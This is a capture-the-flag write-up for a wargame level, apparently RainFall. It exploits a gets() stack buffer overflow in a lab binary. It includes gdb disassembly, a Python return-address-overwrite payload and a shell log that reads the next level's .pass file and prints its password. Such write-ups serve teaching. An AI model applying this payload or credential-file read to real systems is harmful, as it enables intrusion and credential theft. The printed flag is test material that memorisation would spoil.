# Level 1 - Buffer Overflow

## Vulnerability
Classic buffer overflow using `gets()` function.

## Analysis

### Buffer Size Calculation
```bash
(gdb) disas main
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50        # 80 bytes allocated
```

Stack layout:
- 76 bytes for buffer
- 4 bytes for saved EBP
- 4 bytes for return address

### Finding the run() Function
```bash
(gdb) info functions
0x08048444  run

(gdb) disas run
   0x08048444 <+0>:     push   ebp
   ...
   0x0804845d <+25>:    call   0x8048360 <system@plt>
```

## Exploitation

### Step 1: Calculate Offset
Buffer + EBP = 76 + 4 = 80 bytes

### Step 2: Craft Payload
```python
# Python payload
padding = "A" * 76
ebp = "BBBB"
ret_addr = "\x44\x84\x04\x08"  # Address of run() in little-endian

payload = padding + ebp + ret_addr
```

### Step 3: Execute
```bash
level1@RainFall:~$ (python -c 'print "A"*76 + "BBBB" + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Key Concepts
- Buffer overflow
- Return address overwrite
- gets() vulnerability
- Little-endian format